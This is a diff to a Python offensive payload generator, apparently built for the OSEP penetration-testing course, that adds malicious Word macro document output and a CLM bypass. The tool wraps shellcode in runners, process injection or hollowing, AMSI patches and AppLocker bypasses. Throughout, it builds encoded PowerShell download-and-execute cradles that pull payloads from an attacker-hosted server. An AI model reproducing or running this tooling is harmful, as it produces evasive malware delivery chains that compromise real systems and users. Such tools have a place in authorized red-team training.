@@ -3,7 +3,7 @@ import argparse
 import tempfile
 import shutil
 
-from tradecraft import c, cs, ps
+from tradecraft import c, cs, ps, vba
 from tradecraft.utils import *
 
 from urllib.parse import urlparse
@@ -12,7 +12,7 @@ rootdir = os.path.dirname(__file__)
 
 def argparser():
     input_format = ['', '.raw', '.bin', '.txt', '.exe', '.dll']
-    output_format = ['', '.elf', '.exe', '.dll', '.ps1', '.ps', 'hta', '.js', '.xml']
+    output_format = ['', '.elf', '.exe', '.dll', '.ps1', '.ps', '.doc', '.docm', '.hta', '.js', '.xml']
 
     parser = argparse.ArgumentParser(description='Tradcrafts automation for Offensive Security PEN-300 (OSEP)', formatter_class=ArgumentFormatter)
     
@@ -37,19 +37,20 @@ def argparser():
 
     parser.add_argument('--reflection', action='store_true', help='assembly reflection {cs, ps1}')
     parser.add_argument('--amsi', action='store_true', help='amsi patch {cs, ps1}')
+    parser.add_argument('--clm', action='store_true', help='clm bypass')
 
     parser.add_argument('--applocker', nargs='?', choices=['msbuild', 'workflow_compiler', 'installutil'], type=str.lower, const='msbuild', help='applocker bypass {cs}')
     parser.add_argument('--applocker-path', metavar='PATH', default='C:\\Windows\\Tasks', help='applocker bypass {cs}')
-    
+
     parser.add_argument('--platform', choices=['windows', 'linux'], type=str.lower, default='windows', help='payload platform')
     parser.add_argument('--arch', choices=['x32', 'x64', 'any'], type=str.lower, default='any', help='payload architecture')
     
     parser.add_argument('--delay', type=int, help='delay payload execution')
-    parser.add_argument('-e', '--encrypt', choices=[None, 'AES', 'XOR', 'ROT'], default='XOR', type=lambda v: None if v.lower() == "none" else v.upper(), help='encrypt the payload')
-    parser.add_argument('--hide', help='hide windows console', action="store_true")
+    parser.add_argument('-e', '--encrypt', choices=[None, 'AES', 'XOR', 'ROT'], default='XOR', type=lambda v: None if v.lower() == 'none' else v.upper(), help='encrypt the payload')
+    parser.add_argument('--hide', help='hide windows console', action='store_true')
 
-    parser.add_argument('-v', '--verbose', help='verbose output', action="count")
-    parser.add_argument('-q', '--quiet', help='hide banner', action="store_true")
+    parser.add_argument('-v', '--verbose', help='verbose output', action='count')
+    parser.add_argument('-q', '--quiet', help='hide banner', action='store_true')
 
     args = parser.parse_args()
 
@@ -57,7 +58,7 @@ def argparser():
         parser.error('supported input extensions: ' + ', '.join(input_format[1:]))
     
     if os.path.splitext(args.output)[1] not in output_format:
-        parser.error('supported output extensions : ' + ', '.join(input_format[1:]))
+        parser.error('supported output extensions : ' + ', '.join(output_format[1:]))
     
     if args.platform == 'linux' and not args.run:
         parser.error('supported platform: windows extensions')
@@ -74,6 +75,12 @@ def argparser():
     if args.proxy and not args.server:
         parser.error('dll proxy requires server option')
     
+    if args.proxy and not args.server:
+        parser.error('dll proxy requires server option')
+    
+    if args.proxy and not args.dll:
+        parser.error('dll proxy requires dll option')
+
     if not args.quiet:
         print_banner()
 
@@ -135,21 +142,29 @@ def encrypt(enc, shellcode, key=None, iv=None):
 def main():
     args = argparser()
 
-    temp = tempfile.TemporaryDirectory()
-    tempdir = temp.name
-    target_basename = os.path.basename(args.output)
-    target = os.path.join(tempdir, target_basename)
-    target_path = os.path.splitext(target)[0]
-    target_name = os.path.basename(target_path)    
-    
     input_ext = os.path.splitext(args.input)[1]
     output_ext = os.path.splitext(args.output)[1]
+
+    temp = tempfile.TemporaryDirectory()
+    tempdir = temp.name
+
+    output_basename = os.path.basename(args.output)
+    output = os.path.join(tempdir, output_basename)
+    target = output
+    if (output_ext == '.doc' or output_ext == '.docm'):
+        target = target.replace(output_ext, '.exe')
+    target_basename = os.path.basename(target)
+    target_path = os.path.splitext(target)[0]
+    target_name = os.path.basename(target_path)
+    
+    shellcode_arch = args.arch
 
     if input_ext in ['', '.bin', '.raw', '.txt']:
         input_file = args.input
 
-    elif input_ext in ['.exe', '.dll']:
+    elif input_ext in ['.exe', '.dll', '.doc', '.docm']:
         print_info('Generating shellcode using donut')
+        shellcode_arch = get_arch(args.input)
         donut(args.input, os.path.join(tempdir, 'shellcode.bin'), args.arch, args.amsi, args._class, args.method, args.verbose)
         
         input_file = os.path.join(tempdir, 'shellcode.bin')
@@ -187,16 +202,16 @@ def main():
             
             shellcode, key, iv  = encrypt(args.encrypt, shellcode, key, iv)
 
-    if output_ext in ['.exe', '.dll']:
+    if output_ext in ['.exe', '.dll', '.doc', '.docm']:
         if args.run:
             print_info('Generating shellcode runner payload')
             code = cs.shellcode_runner(shellcode, args.encrypt, key, iv, args.delay)
         elif args.inject:
             print_info('Generating process injection payload')
-            code = cs.process_injection(shellcode, args.encrypt, key, iv, args.delay, args.process, args.arch)
+            code = cs.process_injection(shellcode, args.encrypt, key, iv, args.delay, args.process, shellcode_arch)
         elif args.hollow:
             print_info('Generating process hollowing  payload')
-            code = cs.process_hollowing(shellcode, args.encrypt, key, iv, args.delay, args.process)
+            code = cs.process_hollowing(shellcode, args.encrypt, key, iv, args.delay, args.process, shellcode_arch)
         
         with open(os.path.join(tempdir,'program.cs'), 'w') as f:
             f.write(code)
@@ -217,36 +232,44 @@ def main():
         print_success('Payload generated')
         
     if args.server:
-        if output_ext in ['.exe', '.dll']:
-            if args.applocker:
-                print_info(f'Generating {args.applocker} payload')
-                cs_code, xml_code = cs.applocker_bypass(args.applocker, args.applocker_path, url+'/'+target_basename)
-                if args.applocker.lower() == 'msbuild':
-                    with open(os.path.join(tempdir,'build.xml'), 'w') as f:
-                        f.write(xml_code)
-                    ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/build.xml","{args.applocker_path}\\build.xml");C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\MSBuild.exe "{args.applocker_path}\\build.xml"'
+        if output_ext in ['.exe', '.dll', '.doc', '.docm']:
+            if args.reflection or args.applocker:
+                arch = '' if shellcode_arch == 'x32' else '64'
+                if args.applocker:
+                    print_info(f'Generating {args.applocker} payload')
+                    cs_code, xml_code = cs.applocker_bypass(args.applocker, args.applocker_path, target_name, url+'/'+target_basename)
+                    ps_code = ps.applocker_bypass(args.applocker, url, args.applocker_path, target_name, arch, args.amsi)
+
+                    if xml_code:
+                        with open(target_path+'.xml', 'w') as f:
+                            f.write(xml_code)
+                    if cs_code:
+                        with open(target_path+'.cs', 'w') as f:
+                            f.write(cs_code)
+                        
+                    if args.applocker == 'installutil':  
+                        mcs(target_path+'.cs', target_path+'.txt', links=['System.Configuration.Install.dll'], arch=args.arch, hide=args.hide, verbose=False)
+
+                elif args.reflection:
+                    ps_code = ps.assembly_reflection(url+'/'+target_basename, args.amsi)
                 
-                if args.applocker.lower() == 'workflow_compiler':
-                    with open(os.path.join(tempdir,'build.cs'), 'w') as f:
-                        f.write(cs_code)
-                    with open(os.path.join(tempdir,'build.xml'), 'w') as f:
-                        f.write(xml_code)
-                    ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/build.xml","{args.applocker_path}\\build.xml");(New-Object System.Net.WebClient).DownloadFile("{url}/build.cs","{args.applocker_path}\\build.cs");C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe "{args.applocker_path}\\build.xml" results.xml'
+                with open(target_path+'.ps1', 'w') as f:
+                        f.write(ps_code)
                 
-                if args.applocker.lower() == 'installutil':
-                    applocker_target = os.path.join(tempdir,'build'+output_ext)
-                    applocker_cs = os.path.join(tempdir,'build.cs')
-                    with open(applocker_cs, 'w') as f:
-                        f.write(cs_code)
-                    mcs(applocker_cs, applocker_target, link=['System.Configuration.Install.dll'], arch=args.arch, hide=args.hide, verbose=False)
-                    ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/build{output_ext}","{args.applocker_path}\\build.xml");C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U "{args.applocker_path}\\build.xml"'
-            
-            elif args.reflection or args.proxy:
-                code = ps.assembly_reflection(url+'/'+target_basename)
-                reflection = os.path.splitext(target)[0] + '.ps1'
-                with open(reflection, 'w') as f:
-                    f.write(code)
-                ps_command = f'(New-Object System.Net.WebClient).DownloadString("{url}/{target_name}.ps1") | IEX'
+                if args.clm :
+                    ps_command = f'(New-Object System.Net.WebClient).DownloadString("{url}/{target_basename}") | IEX'
+                else:
+                    ps_command = f'IRM {url}/{target_name}.ps1 | IEX'
+                
+                if output_ext in ['.doc', '.docm']:
+                    if output_ext == '.doc':
+                        doc_file = vba.doc(ps_command)
+                    elif output_ext == '.docm':
+                        doc_file = vba.docm(ps_command)
+                    with open(output, 'wb') as f:
+                        f.write(doc_file)
+                    ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/{output_basename}", "{output_basename}");'
+                    
             
             elif output_ext == '.exe':
                 ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/{target_basename}", "{target_basename}"); .\\{target_basename}'   
@@ -256,7 +279,7 @@ def main():
         elif output_ext in ['.ps1', '.ps']:
             print_info('Generating powershell payload')
             ps_command = ps.amsi if args.amsi else ''
-            ps_command += f'(New-Object System.Net.WebClient).DownloadString("{url}/{target_basename}") | IEX'
+            ps_command += f'IRM {url}/{target_basename} | IEX'
         
         else:
             ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/{target_basename}", "{target_basename}")'
@@ -274,13 +297,16 @@ def main():
             print_info('Generating dll proxying payload')
             mingw(os.path.join(tempdir,'proxy.c'), os.path.join(tempdir,dll_name), defines=[os.path.join(tempdir,'proxy.def')], verbose=args.verbose)
             print_success('Payload generated')
-        else:
-            if args.verbose:
-                print_debug('powershell command')
-                print(ps_command)
-            print(f'powershell.exe -enc {ps_encode(ps_command)}')
+            
+            ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/{dll_name}", "{dll_name}.")'    
+
+        if args.verbose:
+            print_debug('powershell command')
+            print(ps_command)
         
-        shutil.copy(target, args.output) 
+        print(f'powershell.exe -enc {ps_encode(ps_command)}')
+        
+        shutil.copy(output, args.output) 
         httpd.serve_forever()
 
 if __name__ == '__main__':
